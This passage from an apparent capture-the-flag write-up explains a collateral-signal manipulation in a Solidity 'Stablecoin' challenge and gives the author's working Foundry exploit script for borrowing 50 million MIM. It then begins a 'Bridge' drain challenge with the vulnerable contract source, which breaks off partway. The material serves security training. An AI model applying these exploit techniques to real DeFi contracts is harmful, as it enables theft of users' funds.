</span><span>    </span><span style=color:#0086b3>uint256</span><span> supply </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>ERC20</span><span>.</span><span style=color:#62a35c>totalSupply</span><span>();
</span><span>    </span><span style=color:#0086b3>uint256</span><span> newSignal </span><span style=color:#a71d5d;font-weight:700>= </span><span>(backingAmount </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 </span><span style=color:#a71d5d;font-weight:700>&&</span><span> supply </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) </span><span style=color:#a71d5d;font-weight:700>?</span><span> ProtocolMath.ONE </span><span style=color:#a71d5d;font-weight:700>:</span><span> backingAmount.</span><span style=color:#62a35c>divUp</span><span>(supply);
</span><span>    signal </span><span style=color:#a71d5d;font-weight:700>=</span><span> newSignal;
</span><span>}
</span></code></pre><p>The <code>_updateSignals()</code> is called inside the <code>liquidate()</code> function. So, liquidating the manager owner will update the signals. The <code>protocolCollatoralToken</code> signal is updated with the value of <code>token.balanceOf(address(this))</code>, token here is ETH. So, since it is calculating the balance of <code>address(this)</code>, i.e manager. We can donate ETH to manager by doing <code>eth.transfer(address(manager), (large ETH)</code>. Now this causes an undefined behaviour in <code>setSignal()</code> function and the <code>backingAmount.divUp(supply)</code> will execute which make the signal value very low than compared to the initial one.<p>So, we succeeded in manipulating the <code>protocolCollatoralToken</code> signal. Now the signal of the <code>protocolCollatoralToken</code> is smaller (at least less than 1e18). Now what happens if we call the <code>manage()</code> again with very small increase in <code>collatoralToken</code>?<p>Lets say, we called <code>manage(eth, 1 , true, 0, false)</code>. Now ultimately the following <code>mint()</code> will execute. So, now the signal showing up here is the manipulated one (we reduced it to less than 1e18).<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(</span><span style=color:#0086b3>address </span><span>to, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
</span><span>    </span><span style=color:#62a35c>_mint</span><span>(to, amount.</span><span style=color:#62a35c>divUp</span><span>(signal));
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>divUp</span><span>(</span><span style=color:#0086b3>uint256 </span><span>a, </span><span style=color:#0086b3>uint256 </span><span>b) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(a </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> 0;
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(((a </span><span style=color:#a71d5d;font-weight:700>*</span><span> ONE) </span><span style=color:#a71d5d;font-weight:700>-</span><span> 1) </span><span style=color:#a71d5d;font-weight:700>/</span><span> b) </span><span style=color:#a71d5d;font-weight:700>+</span><span> 1;
</span><span>    }
</span><span>}
</span></code></pre><p>So, the result from the <code>divUp()</code> will be very high. i.e, we are minting more <code>protocolCollatoralToken</code> by only sending only <code>1 wei</code> of ETH. But this <code>manage()</code> with only 1 wei collatoral increase should be done for several times till we got the good health factor. Once we have the very good health factor and we can able to borrow all <code>50,000,000</code> MIM in one go.<p>Find my messy exploit below,<div class=note-container><button class=note-toggle><div class=note-icon><p>Stablecoin.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>
</span><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/Stablecoin.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>StablecoinSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>
</span><span>    Stablecoin </span><span style=color:#a71d5d;font-weight:700>public </span><span>stablecoin </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Stablecoin</span><span>(</span><span style=color:#0086b3>0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9</span><span>);
</span><span>    Manager </span><span style=color:#a71d5d;font-weight:700>public </span><span>manager </span><span style=color:#a71d5d;font-weight:700>=</span><span> stablecoin.</span><span style=color:#62a35c>manager</span><span>();
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>mim </span><span style=color:#a71d5d;font-weight:700>=</span><span> stablecoin.</span><span style=color:#62a35c>mim</span><span>();
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>eth </span><span style=color:#a71d5d;font-weight:700>=</span><span> stablecoin.</span><span style=color:#62a35c>eth</span><span>();
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>//Manager owner executes the following code:
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// ETH.mint(address(this), 2 ether);
</span><span>    </span><span style=color:#969896;font-style:italic>// ETH.approve(address(manager), type(uint256).max);
</span><span>    </span><span style=color:#969896;font-style:italic>// manager.manage(ETH, 2 ether, true, 3395 ether, true);
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
</span><span>    </span><span style=color:#969896;font-style:italic>// manager.updateSignal(debtToken, 3520 ether);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Stablecoin : "</span><span>, </span><span style=color:#0086b3>address</span><span>(stablecoin));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager : "</span><span>, </span><span style=color:#0086b3>address</span><span>(manager));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner: "</span><span>, </span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>()));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"MIM : "</span><span>, </span><span style=color:#0086b3>address</span><span>(mim));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"MIM Manager : "</span><span>, </span><span style=color:#0086b3>address</span><span>(mim.</span><span style=color:#62a35c>manager</span><span>()));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"ETH : "</span><span>, </span><span style=color:#0086b3>address</span><span>(eth));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"ETH Manager : "</span><span>, </span><span style=color:#0086b3>address</span><span>(eth.</span><span style=color:#62a35c>manager</span><span>()));
</span><span>        
</span><span>        (</span><span style=color:#0086b3>ERC20Signal</span><span> protocolCollateralToken,
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolDebtToken,
</span><span>        PriceFeed priceFeed,
</span><span>        </span><span style=color:#0086b3>uint256</span><span> operationTime,
</span><span>        </span><span style=color:#0086b3>uint256</span><span> baseRate ) </span><span style=color:#a71d5d;font-weight:700>=</span><span>  manager.</span><span style=color:#62a35c>collateralData</span><span>(</span><span style=color:#0086b3>IERC20</span><span>(eth));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolCollateralToken : "</span><span>, </span><span style=color:#0086b3>address</span><span>(protocolCollateralToken));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolCollateralToken Signal: "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>signal</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolCollateralToken totalSupply(): "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolDebtToken : "</span><span>, </span><span style=color:#0086b3>address</span><span>(protocolDebtToken));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolDebtToken Signal : "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>signal</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolDebtToken totalSupply(): "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------------------------"</span><span>);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager balance of ETH : "</span><span>, eth.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager balance of MIM : "</span><span>, mim.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of ETH : "</span><span>, eth.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of MIM : "</span><span>, mim.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of protocolCollateralToken : "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of protocolDebtToken : "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of ETH : "</span><span>, eth.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of MIM : "</span><span>, mim.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of protocolCollateralToken : "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of protocolDebtToken : "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolCollateralToken Signal: "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>signal</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolDebtToken Signal : "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>signal</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------------------------"</span><span>);
</span><span>
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved() : "</span><span>, stablecoin.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>
</span><span>        mim.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(manager), </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max </span><span>);
</span><span>        eth.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(manager), </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max </span><span>);
</span><span>        manager.</span><span style=color:#62a35c>manage</span><span>(eth, </span><span style=color:#0086b3>2.1 ether</span><span>, </span><span style=color:#0086b3>true</span><span>, </span><span style=color:#0086b3>3521 ether</span><span>, </span><span style=color:#0086b3>true</span><span>);
</span><span>        eth.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#0086b3>address</span><span>(manager), </span><span style=color:#0086b3>5990 ether</span><span>);
</span><span>        manager.</span><span style=color:#62a35c>liquidate</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>());
</span><span>        </span><span style=color:#a71d5d;font-weight:700>for </span><span>(</span><span style=color:#0086b3>uint</span><span> i </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0; i &lt; 850; i++){
</span><span>            manager.</span><span style=color:#62a35c>manage</span><span>(eth, 1 , </span><span style=color:#0086b3>true</span><span>, 0, </span><span style=color:#0086b3>false</span><span>);
</span><span>        }
</span><span>        manager.</span><span style=color:#62a35c>manage</span><span>(eth, 0 , </span><span style=color:#0086b3>false</span><span>, </span><span style=color:#0086b3>50_000_000 ether</span><span> , </span><span style=color:#0086b3>true</span><span>);
</span><span>        mim.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#0086b3>0xdeadbeef</span><span>), mim.</span><span style=color:#62a35c>balanceOf</span><span>(player) </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>50_000_000 ether</span><span>);
</span><span>
</span><span>        
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------------------------"</span><span>);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager balance of ETH : "</span><span>, eth.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager balance of MIM : "</span><span>, mim.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of ETH : "</span><span>, eth.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of MIM : "</span><span>, mim.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of protocolCollateralToken : "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Manager Owner balance of protocolDebtToken : "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(manager.</span><span style=color:#62a35c>owner</span><span>())));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of ETH : "</span><span>, eth.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of MIM : "</span><span>, mim.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of protocolCollateralToken : "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of protocolDebtToken : "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolCollateralToken Signal: "</span><span>, protocolCollateralToken.</span><span style=color:#62a35c>signal</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"protocolDebtToken Signal : "</span><span>, protocolDebtToken.</span><span style=color:#62a35c>signal</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------------------------"</span><span>);
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved() : "</span><span>, stablecoin.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>        </span><span style=color:#969896;font-style:italic>// revert();
</span><span>    }
</span><span>
</span><span>}
</span></code></pre></div></div><hr><h1 id=bridge>Bridge</h1><p>P: "You've stumbled upon a cross-chain bridge contract, enabling ETH and ERC20 token transfers between chains. The Bridge contract has 100 ether of flag token. You are given 1 ether of flag token. Your goal is to drain Bridge contract below 90 ether."<div class=note-container><button class=note-toggle><div class=note-icon><p>Bridge.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>//SPDX-License-Identifier:MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.20</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Address} from "@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>IERC20</span><span>, </span><span style=color:#0086b3>IERC20Metadata</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/extensions/</span><span style=color:#0086b3>IERC20Metadata</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>ERC20</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/</span><span style=color:#0086b3>ERC20</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>ERC777</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/token/</span><span style=color:#0086b3>ERC777</span><span>/</span><span style=color:#0086b3>ERC777</span><span>.sol";
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Bridge </span><span>{
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> CHAIN_ID;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> FLAG_TOKEN;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> relayer;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>address</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> remoteBridge;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> remoteBridgeChainId;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>bool</span><span>)) </span><span style=color:#a71d5d;font-weight:700>public</span><span> isTokenRegisteredAtRemote;
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>internal</span><span> msgNonce;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>bytes32 </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>bool</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> relayedMessages;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> relayedMessageSenderChainId;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> relayedMessageSenderAddress;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>address</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> remoteTokenToLocalToken;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>bool</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> isBridgedERC20;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>SendRemoteMessage</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>targetChainId,
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>targetAddress,
</span><span>        </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>sourceAddress,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>msgValue,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>msgNonce,
</span><span>        </span><span style=color:#0086b3>bytes </span><span>msgData
</span><span>    );
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>RelayedMessage</span><span>(</span><span style=color:#0086b3>bytes32 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>msgHash);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>ETH_transfer</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>to, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>ERC20_register</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>token, </span><span style=color:#0086b3>string </span><span>name, </span><span style=color:#0086b3>string </span><span>symbol);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>ERC20_transfer</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>token, </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>to, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_relayer, </span><span style=color:#0086b3>address </span><span>flagToken, </span><span style=color:#0086b3>uint256 </span><span>chainId) {
</span><span>        relayer </span><span style=color:#a71d5d;font-weight:700>=</span><span> _relayer;
</span><span>        FLAG_TOKEN </span><span style=color:#a71d5d;font-weight:700>=</span><span> flagToken;
</span><span>        CHAIN_ID </span><span style=color:#a71d5d;font-weight:700>=</span><span> chainId;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>onlyRelayer</span><span>() {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> relayer, </span><span style=color:#183691>"R"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>onlyRemoteBridge</span><span>() {
</span><span>        </span><span style=color:#0086b3>uint256</span><span> senderChainId </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Bridge</span><span>(</span><span style=color:#0086b3>payable</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>)).</span><span style=color:#62a35c>relayedMessageSenderChainId</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(
</span><span>            </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> remoteBridge[senderChainId] </span><span style=color:#a71d5d;font-weight:700>&&</span><span> senderChainId </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0
</span><span>                </span><span style=color:#a71d5d;font-weight:700>&&</span><span> remoteBridgeChainId[msg.sender] </span><span style=color:#a71d5d;font-weight:700>==</span><span> senderChainId,
</span><span>            </span><span style=color:#183691>"RB"
</span><span>        );
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>IERC20</span><span>(FLAG_TOKEN).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>&lt; </span><span style=color:#0086b3>90 ether</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>registerRemoteBridge</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_remoteChainId, </span><span style=color:#0086b3>address </span><span>_remoteBridge) </span><span style=color:#a71d5d;font-weight:700>external onlyRelayer </span><span>{
</span><span>        remoteBridge[_remoteChainId] </span><span style=color:#a71d5d;font-weight:700>=</span><span> _remoteBridge;
</span><span>        remoteBridgeChainId[_remoteBridge] </span><span style=color:#a71d5d;font-weight:700>=</span><span> _remoteChainId;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>receive</span><span>() </span><span style=color:#a71d5d;font-weight:700>external payable virtual </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == tx</span><span>.</span><span style=color:#a71d5d;font-weight:700>origin</span><span>, </span><span style=color:#183691>"Only EOA"</span><span>);
</span><span>        </span><span style=color:#62a35c>ethOut</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>ethOut</span><span>(</span><span style=color:#0086b3>address </span><span>_to) </span><span style=color:#a71d5d;font-weight:700>public payable virtual </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>ETH_transfer</span><span>(_to, </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> _remoteChainId </span><span style=color:#a71d5d;font-weight:700>=</span><span> CHAIN_ID </span><span style=color:#a71d5d;font-weight:700>==</span><span> 1 </span><span style=color:#a71d5d;font-weight:700>?</span><span> 2 : 1;
</span><span>        </span><span style=color:#0086b3>address</span><span> _remoteBridge </span><span style=color:#a71d5d;font-weight:700>=</span><span> remoteBridge[_remoteChainId];
</span><span>        </span><span style=color:#a71d5d;font-weight:700>this</span><span>.</span><span style=color:#62a35c>sendRemoteMessage</span><span>{value: </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>}(
